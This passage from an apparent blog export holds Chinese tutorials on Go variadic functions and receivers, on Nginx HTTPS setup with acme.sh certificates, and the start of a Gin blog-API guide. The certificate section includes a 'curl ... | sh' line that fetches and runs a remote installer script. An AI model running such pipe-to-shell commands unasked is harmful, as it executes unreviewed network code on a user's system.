ok := PersonInfoDB[<span class="string">"1234"</span>]</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">  处理数据</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="3-0函数调用"><a href="#3-0函数调用" class="headerlink" title="3.0函数调用"></a>3.0函数调用</h2><h4 id="小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。"><a href="#小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。" class="headerlink" title="小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。"></a>小写字母开头的函数只在本包内可见，大写字母开头的函数才能被其他包使用。</h4><h2 id="4-0不定参数"><a href="#4-0不定参数" class="headerlink" title="4.0不定参数"></a>4.0不定参数</h2><h3 id="4-1-不定参数类型"><a href="#4-1-不定参数类型" class="headerlink" title="4.1 不定参数类型"></a>4.1 不定参数类型</h3><h4 id="不定参数类型主要以…type出现。"><a href="#不定参数类型主要以…type出现。" class="headerlink" title="不定参数类型主要以…type出现。"></a>不定参数类型主要以…type出现。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunc</span><span class="params">(argr ...<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> _, agr := <span class="keyword">range</span> argr &#123;</span><br><span class="line">    fmt.Println(agr)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>当我们需要调用函数的时候myfunc(1,2,3).当我们不确定函数类型的时候可以使用…type。</p><h3 id="4-2任意类型的不定参数"><a href="#4-2任意类型的不定参数" class="headerlink" title="4.2任意类型的不定参数"></a>4.2任意类型的不定参数</h3><p>当想传递任意类型，可以指定类型为Interface{}</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printf</span><span class="params">(format <span class="keyword">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prinf</span><span class="params">(args ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, arg := <span class="keyword">range</span> args &#123;</span><br><span class="line"><span class="keyword">switch</span> arg.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">int</span>:</span><br><span class="line">fmt.Println(arg, <span class="string">"is int value."</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">string</span>:</span><br><span class="line">fmt.Println(arg, <span class="string">"is string value."</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">float32</span>:</span><br><span class="line">fmt.Println(arg, <span class="string">"is float32 value."</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(arg, <span class="string">"is unknow value."</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> v1 <span class="keyword">int</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> v2 <span class="keyword">int64</span> = <span class="number">234</span></span><br><span class="line"><span class="keyword">var</span> v3 <span class="keyword">string</span> = <span class="string">"hello"</span></span><br><span class="line"><span class="keyword">var</span> v4 <span class="keyword">float32</span> = <span class="number">1.234</span></span><br><span class="line">prinf(v1, v2, v3, v4)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run <span class="keyword">interface</span>.<span class="keyword">go</span></span><br><span class="line"><span class="number">1</span> is <span class="keyword">int</span> value.</span><br><span class="line"><span class="number">234</span> is unknow value.</span><br><span class="line">hello is <span class="keyword">string</span> value.</span><br><span class="line"><span class="number">1.234</span> is <span class="keyword">float32</span> value.</span><br></pre></td></tr></table></figure></div><h2 id="5-0面向对象"><a href="#5-0面向对象" class="headerlink" title="5.0面向对象"></a>5.0面向对象</h2><p> 类型都是基于值传递的。要想修改变量的值，只能传递指针。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Integer <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a Integer)</span> <span class="title">add</span><span class="params">(b Integer)</span></span> &#123;</span><br><span class="line">a += b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a Integer = <span class="number">1</span></span><br><span class="line">a.add(<span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="string">"a ="</span>, a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go run add.go</span><br><span class="line">a = 1</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Integer <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Integer)</span> <span class="title">add</span><span class="params">(b Integer)</span></span> &#123;</span><br><span class="line">*a += b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a Integer = <span class="number">1</span></span><br><span class="line">a.add(<span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="string">"a = "</span>,a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run add1.<span class="keyword">go</span></span><br><span class="line">a =  <span class="number">3</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx配置HTTPS</title>
      <link href="/2018/10/29/nginx-pei-zhi-https/"/>
      <url>/2018/10/29/nginx-pei-zhi-https/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx配置HTTPS"><a href="#Nginx配置HTTPS" class="headerlink" title="Nginx配置HTTPS"></a>Nginx配置HTTPS</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们站点搭建完协议都是走的HTTP1.1,不排除更低的1.0。<br><img src="http://image.kalifun.top/upload/1811/a739968397a59def.png" alt="http"><br>如果我们没有开启HTTPS你可以看到我们的站点会显示不安全。<br><img src="http://image.kalifun.top/upload/1811/aa4a33294093a978.png" alt="nginx"><br><img src="http://image.kalifun.top/upload/1811/1dd7aa404bb92778.png" alt="Security">  </p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><blockquote><p>HTTPS其实是有两部分组成：HTTP + SSL / TLS，也就是在HTTP上又加了一层处理加密信息的模块。今年出了TLS1.3了。其中还有TLS1.2，感觉更不上世界的步伐啊。</p></blockquote><h3 id="1-获取证书SSL"><a href="#1-获取证书SSL" class="headerlink" title="1.获取证书SSL"></a>1.获取证书SSL</h3><blockquote><p><strong>acme.sh</strong>实现了<code>acme</code>协议, 可以从Let’s Encrypt 生成免费的证书.</p></blockquote><h4 id="1-1-安装acme-sh"><a href="#1-1-安装acme-sh" class="headerlink" title="1.1 安装acme.sh"></a>1.1 安装acme.sh</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.acme.sh | sh</span><br></pre></td></tr></table></figure></div><p> 脚本将会自动执行，当你看到Install success!说明你安装成功。安装成功请把你的服务器的终端关闭。不然你输入相关命令是不生效的哦。  </p><h4 id="1-2生成证书"><a href="#1-2生成证书" class="headerlink" title="1.2生成证书"></a>1.2生成证书</h4><p><strong>acme.sh</strong>实现了<strong>acme</strong>协议支持的所有验证协议. 一般有两种方式验证: http 和 dns 验证.<br> 这里就提及http验证，如果感兴趣你可以去官网查相关资料。<br>http 方式需要在你的网站根目录下放置一个文件, 来验证你的域名所有权,完成验证. 然后就可以生成证书了.</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acme.sh  --issue  -d mydomain.com -d www.mydomain.com  --webroot  /home/wwwroot/mydomain.com/</span><br></pre></td></tr></table></figure></div><p>如果你用的<strong>apache</strong>服务器,<strong>acme.sh</strong>还可以智能的从<strong>apache</strong>的配置中自动完成验证, 你不需要指定网站根目录:</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acme.sh --issue  -d mydomain.com   --apache</span><br></pre></td></tr></table></figure></div><p>如果你用的<strong>nginx</strong>服务器, 或者反代,<strong>acme.sh</strong>还可以智能的从<strong>nginx</strong>的配置中自动完成验证, 你不需要指定网站根目录:</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acme.sh --issue  -d mydomain.com   --nginx</span><br></pre></td></tr></table></figure></div><h4 id="1-3-copy-安装-证书"><a href="#1-3-copy-安装-证书" class="headerlink" title="1.3 copy/安装 证书"></a>1.3 copy/安装 证书</h4>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SH"><figure class="iseeu highlight /sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">acme.sh  --installcert  -d  &lt;domain&gt;.com   \</span><br><span class="line">    --key-file   /etc/nginx/ssl/&lt;domain&gt;.key \</span><br><span class="line">    --fullchain-file /etc/nginx/ssl/fullchain.cer \</span><br><span class="line">    --reloadcmd  <span class="string">" nginx -s reload"</span></span><br></pre></td></tr></table></figure></div><p> 修正一下，请使用nginx -s reload.如果安装官方会报没有这个命令，除非你去init.d/nginx进行修改才可以。  </p><h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p>  http默认是监听80端口，而https监听的是443端口。</p><blockquote><p>domain.com.conf<br>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">  <span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> domain.com;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm default.html default.htm default.php;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$host</span> != domain.com) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://domain.com<span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">root</span>  /home/www/domain;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/fullchain.cer;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span>   /etc/nginx/ssl/domain.top.key;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> <span class="string">'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256'</span>;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">50m</span>;</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">1d</span>;</span><br><span class="line">    <span class="attribute">ssl_session_tickets</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_stapling</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_stapling_verify</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">resolver</span> <span class="number">119.29.29.29</span> <span class="number">8.8.8.8</span> valid=<span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">resolver_timeout</span> <span class="number">10s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">"max-age=31536000; includeSubDomains; preload"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ .*\.(php|php5)?$</span></span><br><span class="line"><span class="regexp"></span>&#123;</span><br><span class="line"><span class="attribute">fastcgi_pass</span>  unix:/tmp/php-cgi.sock;</span><br><span class="line"><span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line"><span class="attribute">include</span> fastcgi.conf;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf|ico)$</span> &#123;</span><br><span class="line">      <span class="attribute">expires</span> <span class="number">30d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ .*\.(js|css)?$</span> &#123;</span><br><span class="line">      <span class="attribute">expires</span> <span class="number">15d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></blockquote><p>如果你的也是WordPress站点，那你等等吧。你网站绝对无法正常开启https。你会发现还是会报（你的连接不完全安全）。<br> 点击F12，查看Console。它的意思是你的网站已经是https了，但是有些连接还是http地址。好不容易搞定，我又要跑去后台，把以前是http的地址改成https。<br>还有一种偷懒的方法，那就是去数据库进行update。找到你站点的数据库，来到wp_postsde表。执行sql语句。<br>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.  update wp_posts set post_content = replace(post_content,&apos;http://&apos;,&apos;https://&apos;);</span><br></pre></td></tr></table></figure></div></p><p>当你改完之后你刷新页面就可以看到效果了。<br>  <img src="https://image.kalifun.top/upload/1811/fa267fcc3336370a.png" alt="https"><br> 看到这个是不是舒畅了，总比之前报红好。<br>  <img src="https://image.kalifun.top/upload/1811/2c5d5dcd80ffbf5f.png" alt="sll"><br>最好推荐一个ssl的跑分网站<a href="https://www.ssllabs.com/ssltest/index.html" target="_blank" rel="noopener">SSL Server Test</a><br>  <img src="https://image.kalifun.top/upload/1811/2b95e408e7fa59e1.png" alt="SSL Server Test"></p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin搭建Blog API‘s （二）</title>
      <link href="/2018/10/26/gin-da-jian-blog-api-s-er/"/>
      <url>/2018/10/26/gin-da-jian-blog-api-s-er/</url>
      
        <content type="html"><![CDATA[<h1 id="Gin搭建Blog-API‘s-（二）"><a href="#Gin搭建Blog-API‘s-（二）" class="headerlink" title="Gin搭建Blog API‘s （二）"></a>Gin搭建Blog API‘s （二）</h1><h2 id="按照Gin搭建Blog-API’s-一-教程来的。此为原作者。"><a href="#按照Gin搭建Blog-API’s-一-教程来的。此为原作者。" class="headerlink" title="按照Gin搭建Blog API’s (一)教程来的。此为原作者。"></a>按照<a href="https://github.com/EDDYCJY/blog/blob/master/golang/gin/2018-02-16-Gin%E5%AE%9E%E8%B7%B5-%E8%BF%9E%E8%BD%BD%E4%B8%89-%E6%90%AD%E5%BB%BABlogAPIs-02.md" target="_blank" rel="noopener">Gin搭建Blog API’s (一)</a>教程来的。此为原作者。</h2><h2 id="定义接口"><a href="#定义接口" class="headerlink" title="定义接口"></a>定义接口</h2><ul><li>获取标签列表：GET(“/tags”)</li><li>新建标签：POST(“/tags”)</li><li>更新指定标签：PUT(“/tags/:id”)</li><li>删除指定标签：DELETE(“/tags/:id”)</li></ul><h2 id="编写路由空壳"><a href="#编写路由空壳" class="headerlink" title="编写路由空壳"></a>编写路由空壳</h2><p>在routers下创建api目录，我们当前第一个版本，因此在api下新建v1目录，再创建tag.go。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 获取tags</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 新增tags</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EditTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 更新tags</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DeleteTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 删除tags</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="注册路由"><a href="#注册路由" class="headerlink" title="注册路由"></a>注册路由</h2><p>修改router.go</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"gin-blog/routers/api/v1"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span> *<span class="title">gin</span>.<span class="title">Engine</span></span> &#123;</span><br><span class="line">r := gin.New()</span><br><span class="line">r.Use(gin.Logger())</span><br><span class="line">r.Use(gin.Recovery())</span><br><span class="line"></span><br><span class="line">gin.SetMode(setting.RunModel)</span><br><span class="line"></span><br><span class="line">apiv1 := r.Group(<span class="string">"/api/v1"</span>)</span><br><span class="line">&#123;</span><br><span class="line">apiv1.GET(<span class="string">"/tags"</span>,v1.GetTags)</span><br><span class="line">apiv1.POST(<span class="string">"/tags"</span>,v1.AddTags)</span><br><span class="line">apiv1.PUT(<span class="string">"/tags/:id"</span>,v1.EditTags)</span><br><span class="line">apiv1.DELETE(<span class="string">"/tags/:id"</span>,v1.DeleteTags)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// r.GET("/test",func(c *gin.Context)&#123;</span></span><br><span class="line"><span class="comment">// c.JSON(200,gin.H&#123;</span></span><br><span class="line"><span class="comment">// "message":"ok",</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>当出现下面这样，说明我们设计的路由规则通过了。<br><a href="https://postimg.cc/0bBHm7Xz" target="_blank" rel="noopener"><img src="https://i.postimg.cc/DwvV9gqP/answer.png" alt="answer.png"></a></p><h4 id="目前的目录树是："><a href="#目前的目录树是：" class="headerlink" title="目前的目录树是："></a>目前的目录树是：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">│  main.<span class="keyword">go</span></span><br><span class="line">│  test.<span class="keyword">go</span></span><br><span class="line">│</span><br><span class="line">├─conf</span><br><span class="line">│      app.ini</span><br><span class="line">│</span><br><span class="line">├─middleware</span><br><span class="line">├─models</span><br><span class="line">│      models.<span class="keyword">go</span></span><br><span class="line">│</span><br><span class="line">├─pkg</span><br><span class="line">│  ├─e</span><br><span class="line">│  │      code.<span class="keyword">go</span></span><br><span class="line">│  │      msg.<span class="keyword">go</span></span><br><span class="line">│  │</span><br><span class="line">│  ├─setting</span><br><span class="line">│  │      setting.<span class="keyword">go</span></span><br><span class="line">│  │</span><br><span class="line">│  └─util</span><br><span class="line">│          pagination.<span class="keyword">go</span></span><br><span class="line">│</span><br><span class="line">├─routers</span><br><span class="line">│  │  router.<span class="keyword">go</span></span><br><span class="line">│  │</span><br><span class="line">│  └─api</span><br><span class="line">│      └─v1</span><br><span class="line">│              tag.<span class="keyword">go</span></span><br><span class="line">│</span><br><span class="line">└─runtime</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">## 编写标签列表models逻辑</span></span><br><span class="line"><span class="string">下载依赖包[validation](https://beego.me/docs/mvc/controller/validation.md)。用于数据验证和错误收集的模块。</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="keyword">go</span></span><br><span class="line"><span class="keyword">go</span> get github.com/astaxie/beego/validation</span><br></pre></td></tr></table></figure></div><p> 在models目录下创建tag.go</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 